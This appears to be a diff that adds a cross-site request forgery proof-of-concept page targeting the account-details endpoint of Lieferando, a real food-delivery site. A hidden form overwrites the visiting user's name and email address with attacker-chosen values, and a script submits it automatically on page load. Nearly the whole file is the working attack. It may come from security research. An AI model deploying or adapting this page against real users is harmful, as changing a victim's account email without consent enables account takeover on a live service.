@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <h1><b>CSRF successful</b></h1>
+</body>
+</html>
+        <form method="post" action="https://www.lieferando.de/en/myaccount/my-details">
+            <input type="hidden" name="type" value="data">
+            <input type="hidden" name="2521d645af" value="523a6ca8c6bf12888c4c1643806fdec3935dae5c786776f5447cb9a8ae389d84">
+
+            <div class="grid-11">
+                <p class="nawlabel">Name</p>
+                <label for="name">
+                    <span class="wai_screenreader">
+                        Name                    </span>
+                </label>
+
+                <div class="nawinputcontainer">
+                    <div class="textfield-form">
+                        <input type="hidden" name="name"
+                               value="hellovictim"
+                               class="textfield-form mandatory "
+                               id="name"
+                               maxlength="100">
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid-11 off-02">
+                <p class="nawlabel">
+                    Email address                </p>
+
+                <label for="companyname">
+                    <span class="wai_screenreader">
+                        Email address                    </span>
+                </label>
+
+                <div class="nawinputcontainer myaccount-customer-email">
+                                    <div class="textfield-form">
+                        <input type="hidden" name="email"
+                               value="hello02584613@gmail.com"
+                               class="textfield-form mandatory"
+                               id="name"
+                               maxlength="100"
+                                                       >
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid-24">
+                <input type="submit" value="Save data"
+                       class="button details-button">
+            </div>
+        </form>
+
+        <script>
+            document.forms[0].submit();
+        </script>
